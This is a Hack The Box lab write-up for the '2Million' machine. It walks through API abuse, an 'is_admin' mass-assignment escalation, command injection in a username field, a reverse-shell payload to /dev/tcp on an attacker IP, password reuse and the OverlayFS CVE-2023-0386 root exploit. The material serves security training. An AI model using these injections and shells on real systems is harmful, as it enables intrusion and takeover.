# HTB 2Million Machine Writeup
<img width="1200" height="909" alt="image" src="https://github.com/user-attachments/assets/dc8c465b-65f4-40f7-8b51-8648ec2557b2" />

## Machine Information

- **Target IP**: 10.10.11.221
- **Operating System**: Linux
- **Difficulty**: Easy
- **Attack Vector**: API Exploitation + Kernel CVE

## Executive Summary

This writeup documents the exploitation of the HTB 2Million machine, which recreated the old HTB invite system. The attack path involved reverse engineering JavaScript code to discover API endpoints, exploiting privilege escalation through API manipulation, achieving command injection, and escalating to root privileges using CVE-2023-0386 (OverlayFS vulnerability).

## Reconnaissance

### Port Scanning

```bash
nmap -sS --open -p- --min-rate 5000 10.10.11.221
```

![Port Scan Results](images/Pasted%20image%2020250828222200.png)

**Open Ports**: 22 (SSH), 80 (HTTP)

### Virtual Host Configuration

```bash
nano /etc/hosts
# Added: 10.10.11.221 2million.htb
```

## Web Application Analysis

### Invite Code System

The web application featured an invite code requirement at `http://2million.htb/invite`:

![Invite Code Page](images/Pasted%20image%2020250828223520.png)


### JavaScript Code Analysis

Source code analysis revealed a reference to `/js/inviteapi.min.js` containing obfuscated JavaScript:

```javascript
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

**Deobfuscated Code**:

```javascript
function verifyInviteCode(code) {
    var formData = {"code": code};
    $.ajax({
        type: "POST",
        dataType: "json", 
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) { console.log(response) },
        error: function (response) { console.log(response) }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) { console.log(response) },
        error: function (response) { console.log(response) }
    })
}
```

## API Exploitation

### Invite Code Generation Discovery

```bash
curl -sX POST http://2million.htb/api/v1/invite/how/to/generate | jq
```

![API Response](images/Pasted%20image%2020250907182212.png)

The response contained Base64-encoded instructions: "In order to generate the invite code, make a POST request to /api/v1/invite/generate"

### Invite Code Retrieval

```bash
curl -sX POST http://2million.htb/api/v1/invite/generate | jq
```

![Invite Code Generation](images/Pasted%20image%2020250907182403.png)

**Decoded Invite Code**: LX5DZ-GOPQ1-3Y3IA-K1AY6

### User Registration

Using the obtained invite code, registration was completed and access gained to the user dashboard:

![User Dashboard](images/Pasted%20image%2020250907183033.png)

### API Endpoint Discovery

API enumeration revealed multiple endpoints:

![API Endpoints](images/Pasted%20image%2020250907184221.png)

**Key Finding**: Administrative endpoints required elevated privileges.

## Privilege Escalation (API Level)

### Profile Update Vulnerability

Testing the `/api/v1/user/update/profile` endpoint revealed insufficient access controls:

**Initial Request**: ![Update Profile Error](images/Pasted%20image%2020250907221520.png)

**With Email Parameter**: ![Email Required](images/Pasted%20image%2020250907221639.png)

**Admin Privilege Escalation**:

```json
{
    "email": "user@example.com",
    "is_admin": 1
}
```

![Admin Privilege Granted](images/Pasted%20image%2020250907221835.png)

## Command Injection

### VPN Generation Endpoint

With admin privileges, the `/api/v1/admin/vpn/generate` endpoint became accessible:

![VPN Generation Request](images/Pasted%20image%2020250907222649.png)

**Username Parameter Required**:

![VPN Generated](images/Pasted%20image%2020250907222833.png)

### Command Injection Discovery

Testing command injection in the username parameter:

```json
{"username":"test;id;"}
```

![Command Injection Success](images/Pasted%20image%2020250907223225.png)

**Successful Command Execution**: The `id` command was executed, confirming command injection vulnerability.

### Reverse Shell

```json
{"username":"test;bash -c 'exec bash -i &>/dev/tcp/10.10.15.12/443 <&1';"}
```

**Result**: Reverse shell obtained as `www-data` user.

## Lateral Movement

### Database Credential Discovery

Environment variable analysis revealed database credentials: **DB_PASSWORD**: SuperDuperPass123

### SSH Access

The database password was reused for the admin user account:

![SSH Access](images/Pasted%20image%2020250907223648.png)

### User Flag

![User Flag](images/Pasted%20image%2020250907224011.png)

## Privilege Escalation (System Level)

### Email Analysis

Admin's email contained a critical security advisory:

```
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Subject: Urgent: Patch System OS

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

### CVE-2023-0386 Exploitation

The email referenced OverlayFS vulnerability CVE-2023-0386:

```bash
git clone https://github.com/xkaneiki/CVE-2023-0386
scp cve.zip admin@2million.htb:/tmp
```

### Root Access

Following the exploit repository instructions:

![Root Access](images/Pasted%20image%2020250907225916.png)

**Result**: Root privileges achieved and root flag obtained.

## Technical Analysis

### Vulnerability Chain

1. **JavaScript Analysis** → Discovery of hidden API endpoints
2. **API Enumeration** → Identification of administrative functions
3. **Privilege Escalation** → Manipulation of user profile via API
4. **Command Injection** → RCE through VPN generation endpoint
5. **Credential Reuse** → SSH access with database password
6. **Kernel Exploitation** → CVE-2023-0386 for root access

### Key Vulnerabilities

- **Insufficient Access Controls**: API endpoints lacked proper authorization
- **Command Injection**: Unsanitized input in VPN generation function
- **Credential Reuse**: Same password across multiple services
- **Kernel Vulnerability**: Unpatched OverlayFS CVE

## Key Lessons

1. **API Security**: Proper authorization required for all endpoints
2. **Input Validation**: Command injection prevention through sanitization
3. **Credential Management**: Avoid password reuse across services
4. **Patch Management**: Critical kernel vulnerabilities require immediate patching
5. **Code Obfuscation**: Client-side obfuscation provides minimal security

## Conclusion

The HTB 2Million machine effectively demonstrated a realistic attack scenario combining web application vulnerabilities with system-level exploitation. The machine highlighted the importance of secure API design, proper input validation, and timely security updates. The recreation of the old HTB invite system provided an educational platform for understanding API security and privilege escalation techniques.
